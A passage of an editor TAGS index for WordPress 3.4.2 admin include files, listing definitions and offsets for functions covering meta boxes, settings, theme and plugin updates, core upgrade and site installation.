	$icon = wp_get_attachment_image( $post->ID, 'thumbnail', true );icon713,25538
	$attachment_data = wp_get_attachment_metadata( $id );attachment_data714,25604
	$thumb = isset( $attachment_data['thumb'] );thumb715,25659
function wp_dropdown_roles( $selected = false ) {wp_dropdown_roles756,27505
function wp_dropdown_roles( $selected = false ) {selected756,27505
	$p = '';p757,27555
	$r = '';r758,27565
	$editable_roles = get_editable_roles();editable_roles760,27576
	foreach ( $editable_roles as $role => $details ) {role762,27618
		$name = translate_user_role($details['name'] );name763,27670
		if ( $selected == $role ) // preselect specified roleselected764,27720
			$p = "\n\t<option selected='selected' value='" . esc_attr($role) . "'>$name</option>";p765,27776
function wp_convert_hr_to_bytes( $size ) {wp_convert_hr_to_bytes780,28085
	$size = strtolower($size);size781,28128
	$bytes = (int) $size;bytes782,28156
		$bytes = intval($size) * 1024;bytes784,28216
		$bytes = intval($size) * 1024 * 1024;bytes786,28290
		$bytes = intval($size) * 1024 * 1024 * 1024;bytes788,28371
function wp_convert_bytes_to_hr( $bytes ) {wp_convert_bytes_to_hr800,28558
	$units = array( 0 => 'B', 1 => 'kB', 2 => 'MB', 3 => 'GB' );units801,28602
	$log = log( $bytes, 1024 );log802,28664
	$power = (int) $log;power803,28693
	$size = pow(1024, $log - $power);size804,28715
function wp_max_upload_size() {wp_max_upload_size815,28876
	$u_bytes = wp_convert_hr_to_bytes( ini_get( 'upload_max_filesize' ) );u_bytes816,28908
	$p_bytes = wp_convert_hr_to_bytes( ini_get( 'post_max_size' ) );p_bytes817,28980
	$bytes = apply_filters( 'upload_size_limit', min($u_bytes, $p_bytes), $u_bytes, $p_bytes );bytes818,29046
function wp_import_upload_form( $action ) {wp_import_upload_form829,29324
	$bytes = apply_filters( 'import_upload_size_limit', wp_max_upload_size() );bytes830,29368
	$size = wp_convert_bytes_to_hr( $bytes );size831,29445
	$upload_dir = wp_upload_dir();upload_dir832,29488
 * @param string $callback Function that fills the box with the desired content. The function should echo its output.should858,30514
function add_meta_box( $id, $title, $callback, $screen = null, $context = 'advanced', $priority = 'default', $callback_args = null ) {add_meta_box863,30992
function add_meta_box( $id, $title, $callback, $screen = null, $context = 'advanced', $priority = 'default', $callback_args = null ) {screen863,30992
		$screen = get_current_screen();screen867,31177
		$screen = convert_to_screen( $screen );screen869,31244
	$page = $screen->id;page871,31287
		$wp_meta_boxes = array();wp_meta_boxes874,31341
				$priority = $a_priority;priority899,32421
				$title = $wp_meta_boxes[$page][$a_context][$a_priority][$id]['title'];title902,32632
				$callback = $wp_meta_boxes[$page][$a_context][$a_priority][$id]['callback'];callback903,32707
				$callback_args = $wp_meta_boxes[$page][$a_context][$a_priority][$id]['args'];callback_args904,32788
		$priority = 'low';priority913,33089
 * @param mixed $object gets passed to the box callback function as first parameteras928,33515
function do_meta_boxes( $screen, $context, $object ) {do_meta_boxes931,33639
	static $already_sorted = false;already_sorted933,33718
	static $already_sorted = false;already_sorted933,33718
		$screen = get_current_screen();screen936,33777
		$screen = convert_to_screen( $screen );screen938,33844
	$page = $screen->id;page940,33887
	$hidden = get_hidden_meta_boxes( $screen );hidden942,33910
	$i = 0;i946,34048
		if ( !$already_sorted && $sorted = get_user_option( "meta-box-order_$page" ) ) {sorted949,34193
			foreach ( $sorted as $box_context => $ids ) {box_context950,34276
		$already_sorted = true;already_sorted957,34508
					$style = '';style968,34944
					$hidden_class = in_array($box['id'], $hidden) ? ' hide-if-js' : '';hidden_class969,34962
function remove_meta_box($id, $screen, $context) {remove_meta_box998,35911
		$screen = get_current_screen();screen1002,36012
		$screen = convert_to_screen( $screen );screen1004,36079
	$page = $screen->id;page1006,36122
		$wp_meta_boxes = array();wp_meta_boxes1009,36176
 * Show settings sections in your admin page callback function with do_settings_sections().with1023,36636
 * The $callback argument should be the name of a function that echoes out anythat1026,36796
function add_settings_section($id, $title, $callback, $page) {add_settings_section1039,37643
		$page = 'general';page1044,37898
		$wp_settings_sections = array();wp_settings_sections1048,37961
 * The $callback argument should be the name of a function that echoes out thethat1064,38560
 * @param string $callback Function that fills the field with the desired form inputs. The function should echo its output.should1074,39056
function add_settings_field($id, $title, $callback, $page, $section = 'default', $args = array()) {add_settings_field1079,39465
function add_settings_field($id, $title, $callback, $page, $section = 'default', $args = array()) {section1079,39465
		$page = 'general';page1084,39755
		$wp_settings_fields = array();wp_settings_fields1088,39816
function do_settings_sections($page) {do_settings_sections1110,40756
function do_settings_fields($page, $section) {do_settings_fields1142,41913
 * Settings errors should be added inside the $sanitize_callback function defined indefined1167,42754
function add_settings_error( $setting, $code, $message, $type = 'error' ) {add_settings_error1183,43655
function add_settings_error( $setting, $code, $message, $type = 'error' ) {type1183,43655
		$wp_settings_errors = array();wp_settings_errors1187,43797
	$new_error = array(new_error1189,43831
function get_settings_errors( $setting = '', $sanitize = false ) {get_settings_errors1220,45023
function get_settings_errors( $setting = '', $sanitize = false ) {setting1220,45023
		$settings_errors = get_transient('settings_errors');settings_errors1232,45651
		$settings_errors = $wp_settings_errors;settings_errors1236,45866
		foreach ( (array) $settings_errors as $key => $details )key1243,46020
 * Errors should be added during the validation callback function for a setting defined in register_setting()for1256,46452
function settings_errors( $setting = '', $sanitize = false, $hide_on_update = false ) {settings_errors1272,47393
function settings_errors( $setting = '', $sanitize = false, $hide_on_update = false ) {setting1272,47393
	$settings_errors = get_settings_errors( $setting, $sanitize );settings_errors1277,47557
	$output = '';output1282,47672
	foreach ( $settings_errors as $key => $details ) {key1283,47687
		$css_id = 'setting-error-' . $details['code'];css_id1284,47739
		$css_class = $details['type'] . ' settings-error';css_class1285,47788
function find_posts_div($found_action = '') {find_posts_div1300,48116
				$post_types = get_post_types( array('public' => true), 'objects' );post_types1317,48951
function the_post_password() {the_post_password1346,49954
function _draft_or_post_title( $post_id = 0 ) {_draft_or_post_title1361,50337
function _draft_or_post_title( $post_id = 0 ) {post_id1361,50337
	$title = get_the_title($post_id);title1362,50385
		$title = __('(no title)');title1364,50442
function _admin_search_query() {_admin_search_query1378,50706
function iframe_header( $title = '', $limit_styles = false ) {iframe_header1390,51050
function iframe_header( $title = '', $limit_styles = false ) {title1390,51050
	$admin_body_class = preg_replace('/[^a-z0-9_-]+/i', '-', $hook_suffix);admin_body_class1393,51207
	$current_screen = get_current_screen();current_screen1395,51281
addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};addLoadEvent1405,51539
function tb_close(){var win=window.dialogArguments||opener||parent||top;win.tb_remove();}tb_close1406,51752
		'uid': '<?php if ( ! isset($current_user) ) $current_user = wp_get_current_user(); echo $current_user->ID; ?>',current_user1409,51905
function iframe_footer() {iframe_footer1452,53384
function _post_states($post) {_post_states1465,53772
	$post_states = array();post_states1466,53803
		$post_status = $_REQUEST['post_status'];post_status1468,53870
		$post_status = '';post_status1470,53919
	$post_states = apply_filters( 'display_post_states', $post_states );post_states1484,54479
		$state_count = count($post_states);state_count1487,54582
		$i = 0;i1488,54620
			( $i == $state_count ) ? $sep = '' : $sep = ', ';i1492,54692
function _media_states( $post ) {_media_states1501,54962
	$media_states = array();media_states1502,54996
	$stylesheet = get_option('stylesheet');stylesheet1503,55022
		$meta_header = get_post_meta($post->ID, '_wp_attachment_is_custom_header', true );meta_header1506,55115
		if ( ! empty( $meta_header ) && $meta_header == $stylesheet )meta_header1507,55200
		$meta_background = get_post_meta($post->ID, '_wp_attachment_is_custom_background', true );meta_background1512,55366
		if ( ! empty( $meta_background ) && $meta_background == $stylesheet )meta_background1513,55459
	$media_states = apply_filters( 'display_media_states', $media_states );media_states1517,55582
		$state_count = count( $media_states );state_count1520,55691
		$i = 0;i1521,55732
			( $i == $state_count ) ? $sep = '' : $sep = ', ';i1525,55805
function compression_test() {compression_test1541,56260
		get : function(test) {get1546,56368
				x.onreadystatechange = function() {x.onreadystatechange1555,56612
				x.onreadystatechange = function() {onreadystatechange1555,56612
		check : function(r, h, test) {check1569,56976
function submit_button( $text = null, $type = 'primary', $name = 'submit', $wrap = true, $other_attributes = null ) {submit_button1613,58442
function submit_button( $text = null, $type = 'primary', $name = 'submit', $wrap = true, $other_attributes = null ) {text1613,58442
function get_submit_button( $text = null, $type = 'primary', $name = 'submit', $wrap = true, $other_attributes = null ) {get_submit_button1634,59700
function get_submit_button( $text = null, $type = 'primary', $name = 'submit', $wrap = true, $other_attributes = null ) {text1634,59700
			$class = 'button-' . $type;class1638,59882
			$class = 'button-secondary delete';class1641,59941
			$class = $type; // Custom cases can just pass in the classes they want to be usedclass1644,60002
	$text = ( null == $text ) ? __( 'Save Changes' ) : $text;text1646,60099
	$id = $name;id1649,60257
		$id = $other_attributes['id'];id1651,60347
	$attributes = '';attributes1655,60420
		foreach ( $other_attributes as $attribute => $value ) {attribute1657,60479
		$attributes = $other_attributes;attributes1661,60717
	$button = '<input type="submit" name="' . esc_attr( $name ) . '" id="' . esc_attr( $id ) . '" class="' . esc_attr( $class );button1664,60756
		$button = '<p class="submit">' . $button . '</p>';button1668,60973
function _wp_admin_html_begin() {_wp_admin_html_begin1674,61050
	$admin_html_class = ( is_admin_bar_showing() ) ? 'wp-toolbar' : '';admin_html_class1675,61084
final class WP_Internal_Pointers {WP_Internal_Pointers1689,61695
	public static function enqueue_scripts( $hook_suffix ) {enqueue_scripts1701,62162
		$registered_pointers = array(registered_pointers1707,62311
		$pointers = (array) $registered_pointers[ $hook_suffix ];pointers1720,62837
		$caps_required = array(caps_required1722,62898
		$dismissed = explode( ',', (string) get_user_meta( get_current_user_id(), 'dismissed_wp_pointers', true ) );dismissed1730,63234
		$got_pointers = false;got_pointers1732,63346
			$got_pointers = true;got_pointers1743,63742
	private static function print_js( $pointer_id, $selector, $args ) {print_js1763,64228
				close: function() {close1777,64606
			setup = function() {setup1785,64757
	public static function pointer_wp330_toolbar() {pointer_wp330_toolbar1800,65057
		$content  = '<h3>' . __( 'New Feature: Toolbar' ) . '</h3>';content1801,65107
	public static function pointer_wp330_media_uploader() {pointer_wp330_media_uploader1818,65748
		$content  = '<h3>' . __( 'Updated Media Uploader' ) . '</h3>';content1819,65805
		$content .= '<p>' . __( 'The single media icon now launches the uploader for all file types, and the new drag and drop interface makes uploading a breeze.' ) . '</p>';makes1820,65870
	public static function pointer_wp330_saving_widgets() {pointer_wp330_saving_widgets1833,66334
		$content  = '<h3>' . __( 'New Feature: Saving Widgets' ) . '</h3>';content1834,66391
	public static function pointer_wp340_customize_current_theme_link() {pointer_wp340_customize_current_theme_link1848,66911
		$content  = '<h3>' . __( 'New Feature: Customizer' ) . '</h3>';content1849,66982
	public static function pointer_wp340_choose_image_from_library() {pointer_wp340_choose_image_from_library1864,67727
		$content  = '<h3>' . __( 'New Feature: Choose Image from Library' ) . '</h3>';content1865,67795
	public static function dismiss_pointers_for_new_users( $user_id ) {dismiss_pointers_for_new_users1879,68375
function convert_to_screen( $hook_name ) {convert_to_screen1895,69059

wordpress/wp-admin/includes/theme-install.php,1636
$themes_allowedtags = array('a' => array('href' => array(), 'title' => array(), 'target' => array()),themes_allowedtags9,116
$theme_field_defaults = array( 'description' => true, 'sections' => false, 'tested' => true, 'requires' => true,theme_field_defaults17,637
function install_themes_feature_list( ) {install_themes_feature_list31,1079
	$feature_list = themes_api( 'feature_list', array( ) );feature_list38,1280
function install_theme_search_form( $type_selector = true ) {install_theme_search_form52,1562
function install_theme_search_form( $type_selector = true ) {type_selector52,1562
	$type = isset( $_REQUEST['type'] ) ? stripslashes( $_REQUEST['type'] ) : 'term';type53,1624
	$term = isset( $_REQUEST['s'] ) ? stripslashes( $_REQUEST['s'] ) : '';term54,1706
function install_themes_dashboard() {install_themes_dashboard78,2605
	$feature_list = get_theme_feature_list( );feature_list87,2898
	foreach ( (array) $feature_list as $feature_name => $features ) {feature_name90,2981
		$feature_name = esc_html( $feature_name );feature_name91,3048
		foreach ( $features as $feature => $feature_name ) {feature95,3195
			$feature_name = esc_html( $feature_name );feature_name96,3250
			$feature = esc_attr($feature);feature97,3296
function install_themes_upload($page = 1) {install_themes_upload119,3780
function display_theme( $theme ) {display_theme137,4463
function display_themes() {display_themes148,4690
function install_theme_information() {install_theme_information163,5070
	$theme = themes_api( 'theme_information', array( 'slug' => stripslashes( $_REQUEST['theme'] ) ) );theme166,5161

wordpress/wp-admin/includes/theme.php,3799
function delete_theme($stylesheet, $redirect = '') {delete_theme18,295
function delete_theme($stylesheet, $redirect = '') {redirect18,295
		$redirect = wp_nonce_url('themes.php?action=delete&stylesheet=' . $stylesheet, 'delete-theme_' . $stylesheet);redirect26,457
		$data = ob_get_contents();data28,649
		$data = ob_get_contents();data41,1008
	$themes_dir = $wp_filesystem->wp_themes_dir();themes_dir59,1549
	$themes_dir = trailingslashit( $themes_dir );themes_dir63,1719
	$theme_dir = trailingslashit($themes_dir . $stylesheet);theme_dir64,1766
	$deleted = $wp_filesystem->delete($theme_dir, true);deleted65,1824
function get_page_templates() {get_page_templates83,2281
function _get_template_edit_filename($fullpath, $containingfolder) {_get_template_edit_filename97,2623
function theme_update_available( $theme ) {theme_update_available111,3007
	static $themes_update;themes_update112,3051
		$themes_update = get_site_transient('update_themes');themes_update118,3162
	$stylesheet = $theme->get_stylesheet();stylesheet123,3267
		$update = $themes_update->response[ $stylesheet ];update126,3366
		$theme_name = $theme->display('Name');theme_name127,3419
		$details_url = add_query_arg(array('TB_iframe' => 'true', 'width' => 1024, 'height' => 800), $update['url']); //Theme browser inside WP? replace this, Also, theme preview JS will override this on the available list.details_url128,3460
		$update_url = wp_nonce_url('update.php?action=upgrade-theme&amp;theme=' . urlencode($stylesheet), 'upgrade-theme_' . $stylesheet);update_url129,3678
		$update_onclick = 'onclick="if ( confirm(\'' . esc_js( __("Updating this theme will lose any customizations you have made. 'Cancel' to stop, 'OK' to update.") ) . '\') ) {return true;}return false;"';update_onclick130,3811
function get_theme_feature_list( $api = true ) {get_theme_feature_list151,5215
function get_theme_feature_list( $api = true ) {api151,5215
	$features = array(features153,5315
		$feature_list = themes_api( 'feature_list', array( ) );feature_list221,7682
	$category_translations = array( 'Colors' => __('Colors'), 'Columns' => __('Columns'), 'Width' => __('Width'),category_translations231,7921
	$wporg_features = array();wporg_features235,8166
	foreach ( (array) $feature_list as $feature_category => $feature_items ) {feature_category236,8194
			$feature_category = $category_translations[$feature_category];feature_category238,8328
function themes_api($action, $args = null) {themes_api272,9477
function themes_api($action, $args = null) {args272,9477
		$args = (object)$args;args275,9547
	$args = apply_filters('themes_api_args', $args, $action); //NOTE: Ensure that an object is returned via this filter.args280,9630
	$res = apply_filters('themes_api', false, $action, $args); //NOTE: Allows a theme to completely override the builtin WordPress.org API.res281,9748
		$request = wp_remote_post('http://api.wordpress.org/themes/info/1.0/', array( 'body' => array('action' => $action, 'request' => serialize($args))) );request284,9903
			$res = new WP_Error('themes_api_failed', __( 'An unexpected error occurred. Something may be wrong with WordPress.org or this server&#8217;s configuration. If you continue to have problems, please try the <a href="http://wordpress.org/support/">support forums</a>.' ), $request->get_error_message() );res286,10088
			$res = maybe_unserialize( wp_remote_retrieve_body( $request ) );res288,10404
				$res = new WP_Error('themes_api_failed', __( 'An unexpected error occurred. Something may be wrong with WordPress.org or this server&#8217;s configuration. If you continue to have problems, please try the <a href="http://wordpress.org/support/">support forums</a>.' ), wp_remote_retrieve_body( $request ) );res290,10524

wordpress/wp-admin/includes/update-core.php,3483
$_old_files = array(_old_files20,270
$_new_bundled_files = array(_new_bundled_files419,14714
function update_core($from, $to) {update_core471,16925
	$php_version    = phpversion();php_version476,17052
	$mysql_version  = $wpdb->db_version();mysql_version477,17085
	$required_php_version = '5.2.4';required_php_version478,17125
	$required_mysql_version = '5.0';required_mysql_version479,17159
	$wp_version = '3.4.2';wp_version480,17193
	$php_compat     = version_compare( $php_version, $required_php_version, '>=' );php_compat481,17217
		$mysql_compat = true;mysql_compat483,17376
		$mysql_compat = version_compare( $mysql_version, $required_mysql_version, '>=' );mysql_compat485,17406
	$distro = '';distro499,18606
	$roots = array( '/wordpress/', '/wordpress-mu/' );roots500,18621
			$distro = $root;distro503,18837
	$maintenance_string = '<?php $upgrading = ' . time() . '; ?>';maintenance_string515,19157
	$maintenance_file = $to . '.maintenance';maintenance_file516,19221
	$result = _copy_dir($from . $distro, $to, array('wp-content') );result521,19441
			$lang_dir = WP_LANG_DIR;lang_dir527,19755
			$lang_dir = WP_CONTENT_DIR . '/languages';lang_dir529,19790
			$wp_lang_dir = $wp_filesystem->find_folder($lang_dir);wp_lang_dir537,20213
				$result = copy_dir($from . $distro . 'wp-content/languages/', $wp_lang_dir);result539,20294
		$old_version = $GLOBALS['wp_version']; // $wp_version in local scope == new versionold_version546,20693
		foreach ( (array) $_new_bundled_files as $file => $introduced_version ) {file547,20779
				$directory = ('/' == $file[ strlen($file)-1 ]);directory550,21005
					$dest = $wp_filesystem->wp_plugins_dir();dest554,21141
					$dest = trailingslashit($wp_filesystem->wp_themes_dir()); // Back-compat, ::wp_themes_dir() did not return trailingslash'd pre-3.2dest556,21221
						$result = new WP_Error('copy_failed', __('Could not copy file.'), $dest . $filename);result565,21589
					$_result = copy_dir( $from . $distro . 'wp-content/' . $file, $dest . $filename);_result571,21826
						$result = $_result;result573,22056
		$old_file = $to . $old_file;old_file588,22360
	$db_upgrade_url = admin_url('upgrade.php?step=upgrade_db');db_upgrade_url596,22600
 * This is a temporary function for the 3.1 -> 3.2 upgrade only and will be removed in 3.3for621,23319
function _copy_dir($from, $to, $skip_list = array() ) {_copy_dir632,23671
function _copy_dir($from, $to, $skip_list = array() ) {skip_list632,23671
	$dirlist = $wp_filesystem->dirlist($from);dirlist635,23752
	$from = trailingslashit($from);from637,23797
	$to = trailingslashit($to);to638,23830
	$skip_regex = '';skip_regex640,23860
	foreach ( (array)$skip_list as $key => $skip_file )key641,23879
		$skip_regex = '!(' . rtrim($skip_regex, '|') . ')$!i';skip_regex645,24013
	foreach ( (array) $dirlist as $filename => $fileinfo ) {filename647,24071
			$result = _copy_dir($from . $filename, $to . $filename, $skip_list);result664,24902
 * This function is only needed when the existing install is older than 3.4.0.is675,25124
function _redirect_to_about_wordpress( $new_version ) {_redirect_to_about_wordpress680,25229
	$js_message = __( 'Welcome to WordPress %1$s. You will be redirected to the About WordPress screen. If not, click <a href="%s">here</a>.' );js_message699,25818
	$js_message = str_replace( '"%s"', '"%2$s"', $js_message ); // in lieu of breaking the string.js_message700,25960

wordpress/wp-admin/includes/update.php,5633
function get_preferred_from_update_core() {get_preferred_from_update_core16,272
	$updates = get_core_updates();updates17,316
function get_core_updates( $options = array() ) {get_core_updates32,739
function get_core_updates( $options = array() ) {options32,739
	$options = array_merge( array('available' => true, 'dismissed' => false ), $options );options33,789
	$dismissed = get_site_option( 'dismissed_update_core' );dismissed34,877
	if ( !is_array( $dismissed ) ) $dismissed = array();dismissed35,935
	$from_api = get_site_transient( 'update_core' );from_api36,989
	$updates = $from_api->updates;updates40,1166
	$result = array();result42,1242
function dismiss_core_update( $update ) {dismiss_core_update59,1601
	$dismissed = get_site_option( 'dismissed_update_core' );dismissed60,1643
function undismiss_core_update( $version, $locale ) {undismiss_core_update65,1831
	$dismissed = get_site_option( 'dismissed_update_core' );dismissed66,1885
	$key = $version.'|'.$locale;key67,1943
function find_core_update( $version, $locale ) {find_core_update73,2120
	$from_api = get_site_transient( 'update_core' );from_api74,2169
	$updates = $from_api->updates;updates76,2273
function core_update_footer( $msg = '' ) {core_update_footer84,2445
function core_update_footer( $msg = '' ) {msg84,2445
	$cur = get_preferred_from_update_core();cur88,2594
function update_nag() {update_nag115,3369
	$cur = get_preferred_from_update_core();cur124,3537
		$msg = sprintf( __('<a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> is available! <a href="%2$s">Please update now</a>.'), $cur->current, network_admin_url( 'update-core.php' ) );msg130,3704
		$msg = sprintf( __('<a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> is available! Please notify the site administrator.'), $cur->current );msg132,3917
function update_right_now_message() {update_right_now_message139,4212
	$msg = sprintf( __('You are using <span class="b">WordPress %s</span>.'), $GLOBALS['wp_version'] );msg140,4250
		$cur = get_preferred_from_update_core();cur143,4394
function get_plugin_updates() {get_plugin_updates152,4737
	$all_plugins = get_plugins();all_plugins153,4769
	$upgrade_plugins = array();upgrade_plugins154,4800
	$current = get_site_transient( 'update_plugins' );current155,4829
	foreach ( (array)$all_plugins as $plugin_file => $plugin_data) {plugin_file156,4881
function wp_plugin_update_rows() {wp_plugin_update_rows166,5182
	$plugins = get_site_transient( 'update_plugins' );plugins170,5273
		$plugins = array_keys( $plugins->response );plugins172,5393
function wp_plugin_update_row( $file, $plugin_data ) {wp_plugin_update_row180,5624
	$current = get_site_transient( 'update_plugins' );current181,5679
	$r = $current->response[ $file ];r185,5794
	$plugins_allowedtags = array('a' => array('href' => array(),'title' => array()),'abbr' => array('title' => array()),'acronym' => array('title' => array()),'code' => array(),'em' => array(),'strong' => array());plugins_allowedtags187,5830
	$plugin_name = wp_kses( $plugin_data['Name'], $plugins_allowedtags );plugin_name188,6042
	$details_url = self_admin_url('plugin-install.php?tab=plugin-information&plugin=' . $r->slug . '&section=changelog&TB_iframe=true&width=600&height=800');details_url190,6114
	$wp_list_table = _get_list_table('WP_Plugins_List_Table');wp_list_table192,6270
function wp_update_plugin($plugin, $feedback = '') {wp_update_plugin210,7578
function wp_update_plugin($plugin, $feedback = '') {feedback210,7578
	$upgrader = new Plugin_Upgrader();upgrader215,7764
function get_theme_updates() {get_theme_updates219,7840
	$themes = wp_get_themes();themes220,7871
	$current = get_site_transient('update_themes');current221,7899
	$update_themes = array();update_themes226,8006
	foreach ( $current->response as $stylesheet => $data ) {stylesheet227,8033
function wp_update_theme($theme, $feedback = '') {wp_update_theme235,8234
function wp_update_theme($theme, $feedback = '') {feedback235,8234
	$upgrader = new Theme_Upgrader();upgrader240,8418
function wp_theme_update_rows() {wp_theme_update_rows244,8492
	$themes = get_site_transient( 'update_themes' );themes248,8581
		$themes = array_keys( $themes->response );themes250,8697
function wp_theme_update_row( $theme_key, $theme ) {wp_theme_update_row259,8911
	$current = get_site_transient( 'update_themes' );current260,8964
	$r = $current->response[ $theme_key ];r263,9082
	$themes_allowedtags = array('a' => array('href' => array(),'title' => array()),'abbr' => array('title' => array()),'acronym' => array('title' => array()),'code' => array(),'em' => array(),'strong' => array());themes_allowedtags264,9122
	$theme_name = wp_kses( $theme['Name'], $themes_allowedtags );theme_name265,9333
	$details_url = add_query_arg( array( 'TB_iframe' => 'true', 'width' => 1024, 'height' => 800 ), $current->response[ $theme_key ]['url'] );details_url267,9397
	$wp_list_table = _get_list_table('WP_MS_Themes_List_Table');wp_list_table269,9538
function wp_update_core($current, $feedback = '') {wp_update_core284,10810
function wp_update_core($current, $feedback = '') {feedback284,10810
	$upgrader = new Core_Upgrader();upgrader289,10995
function maintenance_nag() {maintenance_nag294,11071
		$msg = sprintf( __('An automated WordPress update has failed to complete - <a href="%s">please attempt the update again now</a>.'), 'update-core.php' );msg300,11207
		$msg = __('An automated WordPress update has failed to complete! Please notify the site administrator.');msg302,11368

wordpress/wp-admin/includes/upgrade.php,25277
function wp_install( $blog_title, $user_name, $user_email, $public, $deprecated = '', $user_password = '' ) {wp_install37,1017
function wp_install( $blog_title, $user_name, $user_email, $public, $deprecated = '', $user_password = '' ) {deprecated37,1017
	$guessurl = wp_guess_url();guessurl51,1445
	$user_id = username_exists($user_name);user_id61,1751
	$user_password = trim($user_password);user_password62,1792
	$email_password = false;email_password63,1832
		$user_password = wp_generate_password( 12, false );user_password65,1903
		$message = __('<strong><em>Note that password</em></strong> carefully! It is a <em>random</em> password that was generated just for you.');message66,1957
		$user_id = wp_create_user($user_name, $user_password, $user_email);user_id67,2099
		$email_password = true;email_password69,2237
		$message = '<em>'.__('Your chosen password.').'</em>';message72,2322
		$user_id = wp_create_user($user_name, $user_password, $user_email);user_id73,2379
		$message = __('User already exists. Password inherited.');message75,2459
	$user = new WP_User($user_id);user78,2524
function wp_install_defaults($user_id) {wp_install_defaults103,3148
	$cat_name = __('Uncategorized');cat_name107,3269
	$cat_slug = sanitize_title(_x('Uncategorized', 'Default category slug'));cat_slug109,3345
		$cat_id = $wpdb->get_var( $wpdb->prepare( "SELECT cat_ID FROM {$wpdb->sitecategories} WHERE category_nicename = %s", $cat_slug ) );cat_id112,3454
		if ( $cat_id == null ) {cat_id113,3588
			$cat_id = $wpdb->insert_id;cat_id115,3786
		$cat_id = 1;cat_id119,3877
	$cat_tt_id = $wpdb->insert_id;cat_tt_id124,4162
	$cat_name = __('Blogroll');cat_name127,4221
	$cat_slug = sanitize_title(_x('Blogroll', 'Default link category slug'));cat_slug129,4297
		$blogroll_id = $wpdb->get_var( $wpdb->prepare( "SELECT cat_ID FROM {$wpdb->sitecategories} WHERE category_nicename = %s", $cat_slug ) );blogroll_id132,4406
		if ( $blogroll_id == null ) {blogroll_id133,4545
			$blogroll_id = $wpdb->insert_id;blogroll_id135,4748
		$blogroll_id = 2;blogroll_id139,4854
	$blogroll_tt_id = $wpdb->insert_id;blogroll_tt_id144,5159
	$default_links = array();default_links147,5232
	$now = date('Y-m-d H:i:s');now189,6909
	$now_gmt = gmdate('Y-m-d H:i:s');now_gmt190,6938
	$first_post_guid = get_option('home') . '/?p=1';first_post_guid191,6973
		$first_post = get_site_option( 'first_post' );first_post194,7049
			$first_post = stripslashes( __( 'Welcome to <a href="SITE_URL">SITE_NAME</a>. This is your first post. Edit or delete it, then start blogging!' ) );first_post197,7127
		$first_post = str_replace( "SITE_URL", esc_url( network_home_url() ), $first_post );first_post199,7280
		$first_post = str_replace( "SITE_NAME", $current_site->site_name, $first_post );first_post200,7367
		$first_post = __('Welcome to WordPress. This is your first post. Edit or delete it, then start blogging!');first_post202,7460
	$first_comment_author = __('Mr WordPress');first_comment_author225,8315
	$first_comment_url = 'http://wordpress.org/';first_comment_url226,8360
	$first_comment = __('Hi, this is a comment.<br />To delete a comment, just log in and view the post&#039;s comments. There you will have the option to edit or delete them.');first_comment227,8407
		$first_comment_author = get_site_option( 'first_comment_author', $first_comment_author );first_comment_author229,8608
		$first_comment_url = get_site_option( 'first_comment_url', network_home_url() );first_comment_url230,8700
		$first_comment = get_site_option( 'first_comment', $first_comment );first_comment231,8783
	$first_page = sprintf( __( "This is an example page. It's different from a blog post because it will stay in one place and will show up in your site navigation (in most themes). Most people start with an About page that introduces them to potential site visitors. It might say something like this:first_page244,9214
		$first_page = get_site_option( 'first_page', $first_page );first_page254,10214
	$first_post_guid = get_option('home') . '/?page_id=2';first_post_guid255,10276
		$user = new WP_User($user_id);user294,12513
function wp_new_blog_notification($blog_title, $blog_url, $user_id, $password) {wp_new_blog_notification321,13635
	$user = new WP_User($user_id);user322,13716
	$email = $user->user_email;email323,13748
	$name = $user->user_login;name324,13777
	$message = sprintf(__("Your new WordPress site has been successfully set up at:message325,13805
function wp_upgrade() {wp_upgrade354,14355
	$wp_current_db_version = __get_option('db_version');wp_current_db_version357,14435
	if ( $wp_db_version == $wp_current_db_version )wp_db_version360,14528
function upgrade_all() {upgrade_all391,15384
	$wp_current_db_version = __get_option('db_version');wp_current_db_version393,15457
	if ( $wp_db_version == $wp_current_db_version )wp_db_version396,15550
		$wp_current_db_version = 0;wp_current_db_version401,15717
		$template = __get_option('template');template404,15797
			$wp_current_db_version = 2541;wp_current_db_version406,15864
function upgrade_100() {upgrade_100474,17109
	$posts = $wpdb->get_results("SELECT ID, post_title, post_name FROM $wpdb->posts WHERE post_name = ''");posts478,17235
				$newtitle = sanitize_title($post->post_title);newtitle482,17417
	$categories = $wpdb->get_results("SELECT cat_ID, cat_name, category_nicename FROM $wpdb->categories");categories488,17595
			$newtitle = sanitize_title($category->cat_name);newtitle491,17781
	$done_ids = $wpdb->get_results("SELECT DISTINCT post_id FROM $wpdb->post2cat");done_ids500,18181
		$catwhere = ' AND ID NOT IN (' . implode(',', $done_posts) . ')';catwhere505,18368
		$catwhere = '';catwhere507,18443
	$allposts = $wpdb->get_results("SELECT ID, post_category FROM $wpdb->posts WHERE post_category != '0' $catwhere");allposts510,18470
			$cat = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->post2cat WHERE post_id = %d AND category_id = %d", $post->ID, $post->post_category) );cat514,18686
function upgrade_101() {upgrade_101527,19104
function upgrade_110() {upgrade_110545,19607
	$users = $wpdb->get_results("SELECT ID, user_nickname, user_nicename FROM $wpdb->users");users549,19671
			$newname = sanitize_title($user->user_nickname);newname552,19827
	$users = $wpdb->get_results("SELECT ID, user_pass from $wpdb->users");users557,19983
	$all_options = get_alloptions_110();all_options565,20303
	$time_difference = $all_options->time_difference;time_difference567,20342
		$server_time = time()+date('Z');server_time569,20394
	$weblogger_time = $server_time + $time_difference*3600;weblogger_time570,20429
	$gmt_time = time();gmt_time571,20486
	$diff_gmt_server = ($gmt_time - $server_time) / 3600;diff_gmt_server573,20508
	$diff_weblogger_server = ($weblogger_time - $server_time) / 3600;diff_weblogger_server574,20563
	$diff_gmt_weblogger = $diff_gmt_server - $diff_weblogger_server;diff_gmt_weblogger575,20630
	$gmt_offset = -$diff_gmt_weblogger;gmt_offset576,20696
	$got_gmt_fields = ! ($wpdb->get_var("SELECT MAX(post_date_gmt) FROM $wpdb->posts") == '0000-00-00 00:00:00');got_gmt_fields584,21018
		$add_hours = intval($diff_gmt_weblogger);add_hours589,21213
		$add_minutes = intval(60 * ($diff_gmt_weblogger - $add_hours));add_minutes590,21257
function upgrade_130() {upgrade_130605,22046
